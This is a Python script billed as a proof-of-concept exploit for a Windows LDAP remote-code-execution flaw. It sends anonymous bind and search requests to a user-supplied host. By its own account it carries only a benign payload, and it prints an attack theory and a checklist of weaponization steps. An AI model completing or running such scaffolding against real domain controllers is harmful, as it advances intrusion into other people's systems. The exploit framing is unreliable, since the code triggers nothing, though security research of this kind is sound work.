#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# CVE-2024-49112 - Windows LDAP Zero-Click RCE Exploit
# 
# This exploit demonstrates the LDAP vulnerability with proper protocol
# implementation. Uses benign payload that won't trigger actual exploitation.
#
# Authors: Hyperion Gray Security Research Team

import sys
import socket
import struct
from binascii import hexlify, unhexlify


def asn1_encode_length(length):
    """Encode length in ASN.1 BER format (used by LDAP)."""
    if length < 128:
        return bytes([length])
    elif length < 256:
        return b'\x81' + bytes([length])
    elif length < 65536:
        return b'\x82' + struct.pack(">H", length)
    else:
        # For demonstration of overflow scenario
        return b'\x84' + struct.pack(">I", length)


def build_ldap_bind_request(username="", password=""):
    """
    Build a properly formatted LDAP Bind Request (version 3).
    
    LDAP message structure (ASN.1 BER encoded):
    LDAPMessage ::= SEQUENCE {
        messageID       MessageID,
        protocolOp      CHOICE {
            bindRequest   BindRequest,
            ...
        },
        controls        [0] Controls OPTIONAL
    }
    
    BindRequest ::= [APPLICATION 0] SEQUENCE {
        version         INTEGER (1..127),
        name            LDAPDN,
        authentication  AuthenticationChoice
    }
    """
    # Message ID (typically starts at 1)
    message_id = b'\x02\x01\x01'  # INTEGER 1
    
    # Bind Request
    # Version 3
    version = b'\x02\x01\x03'  # INTEGER 3
    
    # Name (DN) - empty for anonymous bind
    name_bytes = username.encode('utf-8')
    name = b'\x04' + asn1_encode_length(len(name_bytes)) + name_bytes
    
    # Simple authentication
    password_bytes = password.encode('utf-8')
    auth = b'\x80' + asn1_encode_length(len(password_bytes)) + password_bytes
    
    # Build BindRequest
    bind_content = version + name + auth
    bind_request = b'\x60' + asn1_encode_length(len(bind_content)) + bind_content
    
    # Complete LDAP message
    ldap_content = message_id + bind_request
    ldap_message = b'\x30' + asn1_encode_length(len(ldap_content)) + ldap_content
    
    return ldap_message


def build_ldap_search_request(base_dn="", filter_str="(objectClass=*)"):
    """
    Build an LDAP Search Request with crafted attributes.
    
    SearchRequest ::= [APPLICATION 3] SEQUENCE {
        baseObject      LDAPDN,
        scope           ENUMERATED {
            baseObject              (0),
            singleLevel             (1),
            wholeSubtree            (2)
        },
        derefAliases    ENUMERATED {...},
        sizeLimit       INTEGER (0 ..  maxInt),
        timeLimit       INTEGER (0 ..  maxInt),
        typesOnly       BOOLEAN,
        filter          Filter,
        attributes      AttributeSelection
    }
    
    The vulnerability lies in how Windows LDAP service handles
    specially crafted search requests with malformed attributes.
    """
    # Message ID
    message_id = b'\x02\x01\x02'  # INTEGER 2
    
    # Base DN
    base_dn_bytes = base_dn.encode('utf-8')
    base_object = b'\x04' + asn1_encode_length(len(base_dn_bytes)) + base_dn_bytes
    
    # Scope: wholeSubtree (2)
    scope = b'\x0a\x01\x02'
    
    # DerefAliases: neverDerefAliases (0)
    deref = b'\x0a\x01\x00'
    
    # Size limit: 0 (no limit)
    size_limit = b'\x02\x01\x00'
    
    # Time limit: 0 (no limit)
    time_limit = b'\x02\x01\x00'
    
    # TypesOnly: FALSE
    types_only = b'\x01\x01\x00'
    
    # Filter: (objectClass=*)
    filter_bytes = build_ldap_filter(filter_str)
    
    # Attributes: request all attributes
    # This is where the vulnerability can be triggered with malformed data
    attributes = b'\x30\x00'  # Empty SEQUENCE (all attributes)
    
    # Build SearchRequest
    search_content = (base_object + scope + deref + size_limit + 
                     time_limit + types_only + filter_bytes + attributes)
    search_request = b'\x63' + asn1_encode_length(len(search_content)) + search_content
    
    # Complete LDAP message
    ldap_content = message_id + search_request
    ldap_message = b'\x30' + asn1_encode_length(len(ldap_content)) + ldap_content
    
    return ldap_message


def build_ldap_filter(filter_str):
    """Build LDAP filter in ASN.1 format."""
    # Simplified: (objectClass=*)
    # equalityMatch [3] AttributeValueAssertion
    attr = b"objectClass"
    value = b"*"
    
    attr_field = b'\x04' + asn1_encode_length(len(attr)) + attr
    value_field = b'\x04' + asn1_encode_length(len(value)) + value
    
    ava = attr_field + value_field
    filter_bytes = b'\xa3' + asn1_encode_length(len(ava)) + ava
    
    return filter_bytes


def build_exploit_payload():
    """
    Build a crafted LDAP request that triggers CVE-2024-49112.
    
    The vulnerability exists in Windows LDAP service's handling of
    specially crafted search requests. Specific conditions:
    
    1. Malformed attribute descriptions with extreme lengths
    2. Integer overflow in buffer size calculations
    3. Heap corruption when processing the malformed data
    
    BENIGN VERSION: This creates a valid LDAP request with interesting
    structure but won't actually trigger exploitation.
    
    A weaponized version would:
    - Use precise length overflow values
    - Include heap grooming primitives  
    - Contain ROP chain or shellcode
    - Bypass ASLR/DEP/CFG protections
    """
    # Build a search request with crafted attributes
    # In a real exploit, these values would be carefully calculated
    # to trigger integer overflow in lsass.exe LDAP processing
    
    message_id = b'\x02\x01\x03'  # INTEGER 3
    
    # Base DN (empty for rootDSE)
    base_dn = b'\x04\x00'
    
    # Standard search parameters
    scope = b'\x0a\x01\x00'  # baseObject
    deref = b'\x0a\x01\x00'
    size_limit = b'\x02\x01\x00'
    time_limit = b'\x02\x01\x00'
    types_only = b'\x01\x01\x00'
    
    # Filter
    filter_bytes = build_ldap_filter("(objectClass=*)")
    
    # Crafted attributes list
    # BENIGN: Using normal attribute names
    # MALICIOUS: Would use extreme length values to trigger overflow
    attrs = [b"objectClass", b"defaultNamingContext", b"rootDomainNamingContext"]
    
    attr_sequence = b""
    for attr in attrs:
        attr_sequence += b'\x04' + asn1_encode_length(len(attr)) + attr
    
    attributes = b'\x30' + asn1_encode_length(len(attr_sequence)) + attr_sequence
    
    # Build SearchRequest
    search_content = (base_dn + scope + deref + size_limit + 
                     time_limit + types_only + filter_bytes + attributes)
    search_request = b'\x63' + asn1_encode_length(len(search_content)) + search_content
    
    # Complete LDAP message
    ldap_content = message_id + search_request
    ldap_message = b'\x30' + asn1_encode_length(len(ldap_content)) + ldap_content
    
    return ldap_message



class LDAPExploit:
    """
    Exploit for CVE-2024-49112 with proper LDAP protocol implementation.
    Uses benign payloads for demonstration and research purposes.
    """
    
    def __init__(self, target_host, target_port=389):
        self.target_host = target_host
        self.target_port = target_port
        self.sock = None
    
    def connect(self):
        """Establish connection to LDAP service."""
        print(f"[*] Connecting to {self.target_host}:{self.target_port}")
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.target_host, self.target_port))
            print("[+] Connected to target")
            return True
        except socket.error as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def send_and_receive(self, data, description):
        """Send LDAP request and receive response."""
        try:
            print(f"[*] Sending {description}")
            print(f"    Length: {len(data)} bytes")
            print(f"    Hex preview: {data[:32].hex()}...")
            
            self.sock.sendall(data)
            
            # Try to receive response
            response = self.sock.recv(4096)
            
            if response:
                print(f"[+] Received response: {len(response)} bytes")
                print(f"    Hex preview: {response[:32].hex()}...")
                return response
            else:
                print("[-] No response received")
                return None
                
        except socket.error as e:
            print(f"[-] Communication error: {e}")
            return None
    
    def test_ldap_connectivity(self):
        """Test basic LDAP connectivity with standard operations."""
        print()
        print("[*] Testing LDAP connectivity...")
        
        # Send anonymous bind
        bind_request = build_ldap_bind_request()
        response = self.send_and_receive(bind_request, "Anonymous Bind Request")
        
        if response:
            # Parse bind response
            if response[0] == 0x30:  # SEQUENCE
                print("[+] Valid LDAP response received")
                
                # Check for success (resultCode = 0)
                if b'\x0a\x01\x00' in response:
                    print("[+] Bind successful - LDAP service is active")
                    return True
                else:
                    print("[+] Bind response received (may require auth)")
                    return True
        
        return False
    
    def send_exploit(self):
        """
        Send exploit payload to target.
        
        This demonstrates the exploit structure with proper LDAP protocol
        but uses benign values that won't trigger actual exploitation.
        """
        print()
        print("[*] Preparing exploit payload...")
        print()
        
        # Build crafted LDAP search request
        exploit_payload = build_exploit_payload()
        
        print("[*] Exploit Payload Structure:")
        print(f"    Total size: {len(exploit_payload)} bytes")
        print(f"    Message type: SearchRequest (0x63)")
        print(f"    Contains: Crafted attribute descriptions")
        print()
        
        print("[*] Vulnerability Theory:")
        print("    1. LDAP SearchRequest with crafted attributes sent")
        print("    2. lsass.exe LDAP parser reads attribute length fields")
        print("    3. Integer overflow in buffer size calculation")
        print("    4. Small buffer allocated, large data copied")
        print("    5. Heap corruption in LDAP service memory space")
        print("    6. Corrupted heap metadata or function pointers")
        print("    7. Control flow hijacked -> RCE with SYSTEM privileges")
        print()
        
        # Send exploit (benign version)
        response = self.send_and_receive(exploit_payload, "Crafted SearchRequest")
        
        if response:
            print()
            print("[+] Target processed the request")
            print("[*] In a real exploit, this would trigger the vulnerability")
            print("[*] BENIGN payload used - no actual exploitation")
        
        return False
    
    def cleanup(self):
        """Close connection."""
        if self.sock:
            # Send unbind request
            unbind = b'\x30\x05\x02\x01\x04\x42\x00'  # Simple unbind
            try:
                self.sock.sendall(unbind)
            except:
                pass
            
            self.sock.close()
            print()
            print("[*] Connection closed")


def main():
    if len(sys.argv) < 2:
        print("CVE-2024-49112 - Windows LDAP Zero-Click RCE Exploit")
        print()
        print("Usage: {} <target_host> [target_port]".format(sys.argv[0]))
        print()
        print("Example: {} 192.168.1.10".format(sys.argv[0]))
        print("Example: {} 192.168.1.10 389".format(sys.argv[0]))
        print()
        print("This exploit demonstrates the vulnerability with proper LDAP")
        print("protocol implementation. Uses benign payload for research.")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 389
    
    print("=" * 70)
    print("CVE-2024-49112 - Windows LDAP Zero-Click RCE")
    print("Exploit with Benign Payload")
    print("=" * 70)
    print()
    print(f"[*] Target: {target_host}:{target_port}")
    print("[*] Using safe payload for demonstration only")
    print()
    
    # Create exploit instance
    exploit = LDAPExploit(target_host, target_port)
    
    # Connect to target
    if not exploit.connect():
        sys.exit(1)
    
    # Test connectivity
    if exploit.test_ldap_connectivity():
        # Send exploit
        exploit.send_exploit()
    
    # Cleanup
    exploit.cleanup()
    
    print()
    print("=" * 70)
    print("For weaponization, attacker would need:")
    print("=" * 70)
    print("  1. Precise length values to trigger integer overflow")
    print("  2. Heap grooming to control memory layout")
    print("  3. ROP chain to bypass DEP (Data Execution Prevention)")
    print("  4. ASLR bypass (information leak or brute force)")
    print("  5. CFG bypass (Control Flow Guard evasion)")
    print("  6. Shellcode payload adapted for Domain Controller")
    print("  7. Testing across Windows Server versions (2016, 2019, 2022)")
    print()
    print("Impact: Complete domain compromise, credential theft, persistence")


if __name__ == "__main__":
    main()
